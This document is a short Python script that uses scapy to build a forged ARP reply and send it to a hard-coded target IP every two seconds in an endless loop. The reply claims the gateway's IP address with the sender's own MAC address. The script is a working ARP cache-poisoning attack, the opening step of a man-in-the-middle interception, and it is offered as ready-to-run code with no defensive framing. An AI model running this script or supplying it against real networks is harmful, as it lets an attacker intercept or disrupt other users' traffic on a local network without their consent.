#coding=utf-8
from scapy.all import ARP
from scapy.all import Ether
from scapy.all import sendp
from scapy.all import get_if_hwaddr
from scapy.all import getmacbyip
import os,sys
import signal
a = ARP()
a.show()
print(a)
def build_packet(TargetIp, GateWayAddr):
    TargetMacAddr = None
    while not TargetMacAddr:
        TargetMacAddr = getmacbyip(TargetIp)
    MyMacAddr = get_if_hwaddr("eth0")
    pkt = Ether(src=MyMacAddr, dst=TargetMacAddr) / ARP(hwsrc=MyMacAddr, psrc=GateWayAddr, hwdst=TargetMacAddr, pdst=TargetIp)
    pkt.show()
    print(pkt)
    return pkt

def stop(signal,frame):
    sys.exit(0)
if __name__ == '__main__':
    TargetIp = "192.73.1.16"
    GateWayAddr = "192.73.0.1"
    signal.signal(signal.SIGINT, stop)
    packet = build_packet(TargetIp, GateWayAddr)
    while True:
        sendp(packet, inter=2, iface="eth0")
